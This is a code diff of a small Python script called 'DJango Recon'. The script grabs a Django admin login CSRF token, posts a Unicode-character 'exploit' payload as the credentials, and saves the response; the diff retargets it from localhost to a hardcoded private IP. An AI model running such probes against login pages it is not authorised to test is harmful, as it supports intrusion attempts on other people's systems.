@@ -8,6 +8,8 @@
 import requests
 from bs4 import BeautifulSoup
 
+devIp = "10.128.168.4"
+
 def ui():
     #system('cls')
     print("DJango Recon")
@@ -15,8 +17,7 @@ def ui():
     requestPage(input1)
     pass
 
-
-def requestPage(url = "http://localhost:8000/admin/login/?next=/admin/"):
+def requestPage(url = "http://" + devIp + ":8000/admin/login/?next=/admin/"):
     assert type(url) == str
     
     # Start Session
@@ -32,7 +33,7 @@ def requestPage(url = "http://localhost:8000/admin/login/?next=/admin/"):
     # Payload with Unicode Exploit
     payload = {'username': '漢', 'password': '漢' , "csrfmiddlewaretoken":token}
     page = client.post(url, data = payload)
-    print(page.text) # Another option is r = r.json()
+    print(page.text) # Another option is page = page.json()
     file = open("outputer.html", "w")
     file.write(str(page.text))
     return page.text
@@ -51,8 +52,8 @@ def parseHTML(html_doc, file = False):
         html_doc = contents.read()
         contents.close()
     return BeautifulSoup(html_doc, 'html.parser')
-    #fileContents = BeautifulSoup(html_doc, 'html.parser')
-    #return fileContents.get_text()
+    # fileContents = BeautifulSoup(html_doc, 'html.parser')
+    # return fileContents.get_text()
 
 def textOfInterest(soup):
     contents = []
